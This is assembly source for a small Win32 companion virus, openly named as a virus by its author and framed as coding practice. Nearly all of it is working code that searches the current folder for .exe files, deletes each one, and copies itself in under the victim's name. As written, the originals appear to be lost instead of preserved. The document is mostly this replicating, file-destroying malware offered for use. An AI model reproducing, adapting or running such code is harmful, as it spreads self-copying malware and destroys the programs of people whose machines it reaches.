.386P			
Locals
jumps		

.Model Flat ,StdCall

;Simple win32 companion Self Replicating Automation
;Jheronimus Bolch - Meta Informatic Syndrome Patients
;code is shit but it's simple-hope so....
extrn     ExitProcess     : PROC     
extrn	    GetCommandLineA : PROC	 
extrn     MessageBoxA     : PROC     
extrn MoveFileA:PROC
extrn FindFirstFileA:Proc
extrn FindNextFileA:Proc
extrn CopyFileA:PROC
extrn DeleteFileA:PROC


.Data                                        

text     db "bU-hahahaahahahaha",13,10 ; 
         db "The companion is getting alive...",0
                            

caption  db "Hell0",0 
keimeno db "simple companion w32 virus",13,10
"basically for assembly coding practice",13,10
"Hope you'll enjoy the code...",13,10
"w32.shithead",13,10
"by Jack Daniels",0
psaxnogia db "*.exe",0

search_handle dd 0

myname db 40h dup (0)
newname db 40h dup (0)
search_data db 318 dup (0)
.Code                                  
Main:
call GetCommandLineA
mov ecx,0
jampo:
mov bl,byte ptr[eax+1] 
mov byte ptr[myname+ecx],bl
inc eax
inc ecx
cmp bl,22h
jne jampo
dec ecx
mov byte ptr[myname+ecx],0


push offset search_data
push offset psaxnogia

call FindFirstFileA

cmp eax,-1
je exit
mov search_handle,eax
call infect
more:


mov eax,[search_handle]
push offset search_data
push eax


call FindNextFileA
cmp eax,0
je exit
cmp byte ptr[search_data+44],"_"
je exit

call infect 
jmp more

infect:
mov ecx,0
mov byte ptr[newname+ecx],"_"
newnamecreation:
inc ecx
mov bl,byte ptr[search_data+44+ecx-1]
mov byte ptr[newname+ecx],bl
cmp bl,0
jne newnamecreation
push 0
push offset caption
push offset newname
push 0
call MessageBoxA
push offset [search_data+44]
call DeleteFileA 
push 1h
push offset [search_data+44]
push offset myname
call CopyFileA

push 1h
push offset newname
push offset [search_data+44]
call CopyFileA
ret

exit:
CALL    ExitProcess     


End Main  
